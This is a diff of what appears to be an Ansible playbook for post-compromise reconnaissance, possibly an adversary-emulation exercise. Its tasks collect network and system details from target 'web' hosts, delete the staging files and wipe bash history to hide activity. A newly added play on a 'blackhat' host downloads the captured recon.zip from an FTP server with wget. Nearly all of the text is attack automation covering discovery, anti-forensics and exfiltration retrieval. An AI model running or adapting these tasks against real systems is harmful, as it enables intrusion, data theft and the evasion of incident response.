@@ -36,8 +36,6 @@
       raw: ifconfig; netstat -r > recon/network_config.txt
     - name: list network connections
       raw: lspci > recon/network_connections.txt
-#   - name: list connected network shares/systems
-#     raw: TODO
 - name: system process discovery
   hosts: web
   tasks:
@@ -63,4 +61,11 @@
     - name: delete zip file and recon folder
       raw: rm -rf recon.zip recon
     - name: delete bash history activity
-      raw: for i in {1..17}; do history -d $HISTFILESIZE; done
+      raw: for i in {1..15}; do history -d $HISTFILESIZE; done
+- name: recover captured recon
+  hosts: blackhat
+  tasks:
+    - name: download recon zip from ftp
+      raw: wget --user=anonymous --password='contractor@fazio.com' ftp://ftp.fazio.com:21/upload/recon.zip
+    - name: unzip file
+      raw: unzip recon.zip
